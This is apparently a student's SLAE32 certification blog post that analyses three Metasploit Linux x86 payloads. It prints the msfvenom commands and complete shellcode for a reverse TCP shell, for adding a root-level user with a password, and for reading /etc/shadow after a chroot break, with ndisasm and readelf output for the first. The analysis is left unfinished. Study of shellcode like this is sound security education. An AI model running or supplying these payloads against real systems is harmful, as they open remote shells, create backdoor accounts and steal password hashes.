---
layout: page
title: SLAE32 Assignment 5
---

<div class="well" markdown="1">
<h2>SLAE32 Assignment 5: Analysis</h2>

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1009

Take three payload samples from msfpayload
analyze using ndisasm, libemu, gdb
present analysis

My first thought was to analyze at least one meterpreter shellcode. Alas, they are enormous and I would like to do more with the rest of my life instead of analyzing almost 1MB of shellcode. So instead, I opted for shorter ones. First, I wanted to look at their reverse tcp shellcode. I managed to get mine into 100 bytes, but the Metasploit one is 68 bytes, so I really wanted to see their approach on that one. Second, I wanted to look at their implementation of adduser. For the last one, I had noticed in viewing the payload options that they all had some extra options and one that intrigued me was PrependChrootBreak. I was not sure off the top of my head how they would do that and so I thought that would go well with the read_file shellcode.

<h2>Reverse TCP</h2>
First the shellcode itself:
```
$ msfvenom -p linux/x86/shell_reverse_tcp -f c LHOST=192.168.1.1 LPORT=9999
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x01\x01\x68"
"\x02\x00\x27\x0f\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```
The first thing I did was run it through `ndisasm` to view the assembly code.  

```
$ msfvenom -p linux/x86/shell_reverse_tcp -f raw LHOST=192.168.1.1 LPORT=9999 | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  68C0A80101        push dword 0x101a8c0
0000001D  680200270F        push dword 0xf270002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```

Analyze...


GDB:
Finding entry point take a little extra work, as this elf has the minimal amount of information possible. Commands like `info file` in gdb give no information at all. So the way to find the entry point is with the command readelf:
```
$ readelf -h reverse_tcp
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048054
  Start of program headers:          52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
```
We can see from here that the entry point is 0x8048054, so we can now load it up into gdb and set a breakpoint for that address and run it.


<h2>Add User</h2>
```
$ msfvenom -p linux/x86/adduser -f c USER=assembly PASS=you_slae_me SHELL=/bin/bash
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
unsigned char buf[] =
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x61\x73"
"\x73\x65\x6d\x62\x6c\x79\x3a\x41\x7a\x70\x2f\x76\x6c\x31\x33"
"\x44\x38\x69\x71\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62"
"\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
```



<h2>Read File</h2>
```
$ msfvenom -p linux/x86/read_file -f c  PrependChrootBreak=true PATH=/etc/shadow
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 121 bytes
Final size of c file: 535 bytes
unsigned char buf[] =
"\x31\xc9\x31\xdb\x6a\x46\x58\xcd\x80\x6a\x3d\x89\xe3\x6a\x27"
"\x58\xcd\x80\x89\xd9\x58\xcd\x80\x31\xc0\x50\x66\x68\x2e\x2e"
"\x89\xe3\x6a\x3d\x59\xb0\x0c\xcd\x80\xe2\xfa\x6a\x3d\x89\xd9"
"\x58\xcd\x80\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80"
"\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00"
"\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00"
"\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8"
"\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77"
"\x00";
```
